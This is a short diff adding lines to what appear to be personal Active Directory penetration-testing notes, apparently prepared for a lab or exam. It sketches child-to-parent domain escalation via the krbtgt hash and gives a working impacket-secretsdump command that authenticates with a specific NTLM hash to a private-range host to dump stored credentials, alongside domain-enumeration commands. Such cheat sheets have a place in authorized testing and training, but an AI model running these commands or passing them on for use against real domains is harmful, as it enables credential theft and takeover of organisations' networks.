@@ -188,4 +188,12 @@ SMB LSA
  	** net user /dom
   	** net group /dom
 
+# Formula Child to Parent
+
+	admin privilige on child machince
+ 	krbtgthash
+
+# Impacket
+	impacket-secretsdump child/corpmngr@192.168.98.120 -hashes :4cb3933610b827a281ec479031128cc6 -> using this when you know corpmnrg has a path of administrator local (check with "net localgroup Administrators")
+
 
